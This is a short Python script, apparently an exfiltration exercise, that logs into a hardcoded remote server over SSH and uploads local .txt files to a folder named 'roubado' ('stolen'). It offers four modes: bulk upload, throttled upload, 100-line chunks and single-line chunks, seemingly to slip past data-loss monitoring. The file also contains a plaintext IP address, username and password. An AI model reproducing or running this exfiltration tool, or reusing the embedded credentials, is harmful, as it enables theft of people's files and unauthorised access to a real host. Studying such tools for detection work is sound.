#/usr/bin/python3
from paramiko import SSHClient
from scp import SCPClient
import glob, os
import time

os.chdir("./docs")
ssh = SSHClient()
ssh.load_system_host_keys()
ssh.connect(hostname='65.52.21.60',username='tpr',password='Pedro-Diogo2021')
ssh.exec_command("rm roubado/*")
scp = SCPClient(ssh.get_transport())

def mode1():
    for file in glob.glob("*.txt"):
        scp.put(file, './roubado')


def mode2():
    for file in glob.glob("*.txt"):
        scp.put(file, './roubado')
        time.sleep(20) 

def mode3():
    for file in glob.glob("*.txt"):
        f = open(file, "r")
        lines = f.readlines()
        cnt = 0
        div = 0
        stream = ""
        for line in lines:
            stream = stream + line
            div += 1
            if(div == 100):
                name = "part"+str(cnt)+file
                tmp = open(name, "w+")
                tmp.write(stream)
                tmp.close()
                cnt+=1
                # print(stream)
                # print("name:"+name)
                scp.put(name, './roubado')
                os.remove(name)
                div = 0

def mode4():
    for file in glob.glob("*.txt"):
        f = open(file, "r")
        lines = f.readlines()
        cnt = 0
        for line in lines:
            name = "part"+str(cnt)+file
            tmp = open(name, "w+")
            tmp.write(line)
            tmp.close()
            cnt+=1
            print(line)
            scp.put(name, './roubado')
            os.remove(name)

def main():
    
    mode = int(input("choose mode \n"))
    
    if(mode == 1):
        mode1()
    elif (mode == 2):
        mode2()
    elif (mode == 3):
        mode3()
    elif (mode == 4):
        mode4()
    



main()
